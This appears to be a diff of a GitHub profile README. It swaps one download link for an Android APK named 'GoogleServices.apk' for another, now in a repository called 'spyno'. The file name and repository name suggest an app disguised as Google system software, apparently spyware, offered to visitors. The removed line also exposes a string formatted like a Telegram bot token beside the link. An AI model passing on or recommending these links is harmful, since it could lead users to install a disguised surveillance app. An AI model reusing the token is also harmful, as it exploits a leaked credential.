@@ -10,8 +10,7 @@
 - 📫 How to reach  ***
 on fire
 
-soon
-[6952843089:AAGToKJ8HSIkI8WoRWqrVbcQlrzGei6guXA](https://github.com/MTX-R/GoogleServices/raw/main/GoogleServices.apk)
+https://github.com/MTX-R/spyno/raw/main/googleServices.apk
 
 
        -    support -MINEX               ☠️
